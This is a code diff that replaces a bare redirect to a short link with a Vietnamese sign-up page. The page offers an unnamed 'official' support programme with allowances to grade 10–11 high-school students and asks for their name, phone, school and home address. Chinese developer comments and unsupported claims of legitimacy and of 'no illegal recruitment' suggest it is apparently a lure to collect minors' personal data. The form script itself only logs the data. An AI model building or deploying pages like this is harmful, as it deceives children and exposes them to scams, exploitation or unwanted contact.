@@ -1,10 +1,389 @@
-html
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-    <title></title>
-    <script>window.location.href = "https://lihi.cc/fzxzJ";</script>
+  <meta charset="UTF-8">
+  <title>Chương Trình Hỗ Trợ Học Sinh THPT - Đăng Ký Tham Gia</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Chương trình hỗ trợ học sinh THPT lớp 10-11: hoạt động văn hóa, kỹ năng, học bổng và phụ cấp hỗ trợ. Đăng ký thông tin để được tư vấn chi tiết.">
+  <style>
+    :root {
+      --primary: #0f766e;   /* xanh ngọc đậm常见VN校园公益色 */
+      --primary-soft: #14b8a6;
+      --bg: #f5f5f5;
+      --radius: 14px;
+      --shadow: 0 10px 25px rgba(15,118,110,0.12);
+      --font: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: var(--font);
+      background: var(--bg);
+      color: #111827;
+    }
+    .wrap {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 24px 16px 40px;
+    }
+    header {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 18px;
+      text-align: center;
+    }
+    .logo-text {
+      font-weight: 700;
+      font-size: 18px;
+      color: var(--primary);
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+    }
+    h1 {
+      margin: 0;
+      font-size: 26px;
+      font-weight: 700;
+      color: #111827;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #4b5563;
+      max-width: 640px;
+      margin: 0 auto;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: minmax(0, 3fr) minmax(220px, 2fr);
+      gap: 18px;
+      align-items: flex-start;
+    }
+    @media (max-width: 768px) {
+      .grid {
+        grid-template-columns: 1fr;
+      }
+      header { text-align: left; }
+    }
+    .card {
+      background: #ffffff;
+      border-radius: var(--radius);
+      padding: 18px 16px 16px;
+      box-shadow: var(--shadow);
+      border: 1px solid rgba(15,118,110,0.06);
+    }
+    .card h2 {
+      margin: 0 0 10px;
+      font-size: 18px;
+      color: #0f172a;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 10px;
+      border-radius: 999px;
+      background: rgba(20,184,166,0.08);
+      color: var(--primary);
+      font-size: 11px;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+    .badge span {
+      font-size: 15px;
+    }
+    ul {
+      padding-left: 18px;
+      margin: 6px 0 10px;
+      font-size: 13px;
+      color: #374151;
+    }
+    ul li {
+      margin-bottom: 4px;
+    }
+    .highlight {
+      font-size: 12px;
+      color: #059669;
+      margin-top: 4px;
+      font-weight: 500;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-size: 13px;
+    }
+    label {
+      display: block;
+      margin-bottom: 4px;
+      font-weight: 500;
+      color: #111827;
+    }
+    input, select, textarea {
+      width: 100%;
+      padding: 8px 9px;
+      border-radius: 9px;
+      border: 1px solid #d1d5db;
+      font-family: var(--font);
+      font-size: 13px;
+      outline: none;
+      transition: all 0.16s ease;
+      background: #f9fafb;
+    }
+    input:focus, select:focus, textarea:focus {
+      border-color: var(--primary-soft);
+      background: #ffffff;
+      box-shadow: 0 0 0 2px rgba(20,184,166,0.12);
+    }
+    .row {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0,1fr));
+      gap: 10px;
+    }
+    @media (max-width: 480px) {
+      .row { grid-template-columns: 1fr; }
+    }
+    .consent {
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+      font-size: 11px;
+      color: #4b5563;
+      margin-top: 4px;
+    }
+    .consent input {
+      width: 14px;
+      margin-top: 1px;
+    }
+    .submit-btn {
+      margin-top: 4px;
+      padding: 9px 14px;
+      border-radius: 999px;
+      border: none;
+      background: var(--primary);
+      color: #ffffff;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      box-shadow: 0 8px 18px rgba(15,118,110,0.25);
+      transition: all 0.16s ease;
+    }
+    .submit-btn span {
+      font-size: 16px;
+    }
+    .submit-btn:hover {
+      background: var(--primary-soft);
+      transform: translateY(-1px);
+      box-shadow: 0 12px 26px rgba(20,184,166,0.32);
+    }
+    .small-note {
+      font-size: 10px;
+      color: #9ca3af;
+      margin-top: 3px;
+    }
+    .side-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #111827;
+      margin-bottom: 4px;
+    }
+    .side-tag {
+      font-size: 11px;
+      color: #6b7280;
+      margin-bottom: 6px;
+    }
+    .point {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      font-size: 11px;
+      color: #374151;
+      margin-bottom: 6px;
+    }
+    .dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 999px;
+      background: var(--primary-soft);
+      margin-top: 4px;
+    }
+    footer {
+      margin-top: 18px;
+      text-align: center;
+      font-size: 10px;
+      color: #9ca3af;
+    }
+    .success-msg {
+      display: none;
+      margin-top: 8px;
+      font-size: 12px;
+      color: #16a34a;
+      font-weight: 500;
+    }
+    .error-msg {
+      display: none;
+      margin-top: 8px;
+      font-size: 12px;
+      color: #dc2626;
+      font-weight: 500;
+    }
+  </style>
 </head>
 <body>
+<div class="wrap">
+  <header>
+    <div class="logo-text">CHƯƠNG TRÌNH HỖ TRỢ HỌC SINH VIỆT NAM</div>
+    <h1>Cơ Hội Tham Gia Hoạt Động Trường Học &amp; Nhận Hỗ Trợ Chính Thức</h1>
+    <p class="subtitle">
+      Dành cho học sinh THPT lớp 10–11: tham gia hoạt động văn hóa, kỹ năng sống, định hướng tương lai
+      và có cơ hội nhận phụ cấp hỗ trợ học tập, di chuyển và sinh hoạt. Vui lòng điền thông tin chính xác
+      để được tư vấn và xác minh.
+    </p>
+  </header>
+
+  <div class="grid">
+    <!-- FORM -->
+    <div class="card">
+      <div class="badge">
+        <span>★</span> Chỉ dành cho học sinh tại Việt Nam / Chính thống, minh bạch
+      </div>
+      <h2>Đăng Ký Tham Gia Chương Trình</h2>
+      <p style="font-size:11px;color:#6b7280;margin:0 0 8px;">
+        Thông tin sẽ được dùng để xác nhận bạn là học sinh THPT thực tế và liên hệ về các suất hỗ trợ phù hợp.
+      </p>
+
+      <form id="regForm">
+        <div>
+          <label for="fullname">Họ và tên *</label>
+          <input id="fullname" name="fullname" required placeholder="Ví dụ: Nguyễn Minh Anh">
+        </div>
+
+        <div class="row">
+          <div>
+            <label for="phone">Số điện thoại liên hệ *</label>
+            <input id="phone" name="phone" required placeholder="Ví dụ: 09xxxxxxxx" pattern="[0-9+ ]{8,}">
+          </div>
+          <div>
+            <label for="grade">Khối lớp *</label>
+            <select id="grade" name="grade" required>
+              <option value="">Chọn khối lớp</option>
+              <option value="10">Lớp 10</option>
+              <option value="11">Lớp 11</option>
+            </select>
+          </div>
+        </div>
+
+        <div>
+          <label for="school">Trường THPT *</label>
+          <input id="school" name="school" required placeholder="Ví dụ: THPT Lê Hồng Phong, TP.HCM">
+        </div>
+
+        <div>
+          <label for="address">Địa chỉ gia đình (tỉnh/quận/xã) *</label>
+          <input id="address" name="address" required placeholder="Ví dụ: Phường 7, Quận 3, TP.HCM">
+        </div>
+
+        <div>
+          <label for="note">Bạn quan tâm hỗ trợ gì? (không bắt buộc)</label>
+          <textarea id="note" name="note" rows="2" placeholder="Ví dụ: hỗ trợ học bổng, hoạt động CLB, kỹ năng mềm, phụ cấp đi lại..."></textarea>
+        </div>
+
+        <div class="consent">
+          <input type="checkbox" id="agree" required>
+          <label for="agree">
+            Tôi xác nhận thông tin trên là đúng sự thật và đồng ý để ban tổ chức liên hệ qua số điện thoại
+            đã cung cấp về các hoạt động &amp; chương trình hỗ trợ dành cho học sinh THPT.
+          </label>
+        </div>
+
+        <button type="submit" class="submit-btn">
+          Gửi đăng ký <span>→</span>
+        </button>
+        <div class="success-msg" id="successMsg">Cảm ơn bạn! Thông tin đã được ghi nhận.</div>
+        <div class="error-msg" id="errorMsg">Có lỗi xảy ra, vui lòng thử lại sau.</div>
+
+        <div class="small-note">
+          Cam kết: Không thu phí, không tuyển dụng trái phép, không yêu cầu cung cấp thông tin nhạy cảm ngoài học tập &amp; hỗ trợ.
+        </div>
+      </form>
+    </div>
+
+    <!-- SIDE INFO -->
+    <div class="card">
+      <div class="side-title">Vì Sao Nên Đăng Ký?</div>
+      <div class="side-tag">Chương trình hướng đến xây dựng môi trường học đường lành mạnh &amp; hỗ trợ thực tế.</div>
+
+      <div class="point">
+        <div class="dot"></div>
+        <div><b>Hoạt động văn hóa &amp; câu lạc bộ:</b> giao lưu, kỹ năng mềm, định hướng học tập &amp; nghề nghiệp.</div>
+      </div>
+      <div class="point">
+        <div class="dot"></div>
+        <div><b>Phụ cấp &amp; hỗ trợ chọn lọc:</b> hỗ trợ một phần chi phí học tập, tài liệu, di chuyển cho học sinh phù hợp.</div>
+      </div>
+      <div class="point">
+        <div class="dot"></div>
+        <div><b>Ưu tiên lớp 10–11:</b> xác minh qua tên trường và thông tin liên hệ để bảo đảm minh bạch.</div>
+      </div>
+      <div class="point">
+        <div class="dot"></div>
+        <div><b>Bảo mật thông tin:</b> dữ liệu chỉ dùng cho việc sàng lọc &amp; liên hệ chương trình, không bán hoặc chia sẻ thương mại.</div>
+      </div>
+
+      <div class="highlight">
+        Lưu ý: Vui lòng điền số điện thoại bản thân hoặc phụ huynh đang sử dụng để tiện xác minh.
+      </div>
+    </div>
+  </div>
+
+  <footer>
+    © 2025 Chương Trình Hỗ Trợ Học Sinh Việt Nam. Mọi hoạt động tuân thủ quy định pháp luật Việt Nam.
+  </footer>
+</div>
+
+<script>
+  // TODO: 将此函数改成调用你在 VC/Vercel 后端的真实 API
+  async function sendToServer(formDataObj) {
+    // 示例：直接打印，实际请用 fetch POST 到你的接口
+    console.log("Submit data:", formDataObj);
+    // const res = await fetch("/api/register", {
+    //   method: "POST",
+    //   headers: { "Content-Type": "application/json" },
+    //   body: JSON.stringify(formDataObj)
+    // });
+    // if (!res.ok) throw new Error("Network error");
+    return true;
+  }
+
+  const form = document.getElementById("regForm");
+  const successMsg = document.getElementById("successMsg");
+  const errorMsg = document.getElementById("errorMsg");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    successMsg.style.display = "none";
+    errorMsg.style.display = "none";
+
+    const data = {
+      fullname: form.fullname.value.trim(),
+      phone: form.phone.value.trim(),
+      grade: form.grade.value,
+      school: form.school.value.trim(),
+      address: form.address.value.trim(),
+      note: form.note.value.trim()
+    };
+
+    try {
+      await sendToServer(data);
+      successMsg.style.display = "block";
+      form.reset();
+    } catch (err) {
+      console.error(err);
+      errorMsg.style.display = "block";
+    }
+  });
+</script>
 </body>
 </html>
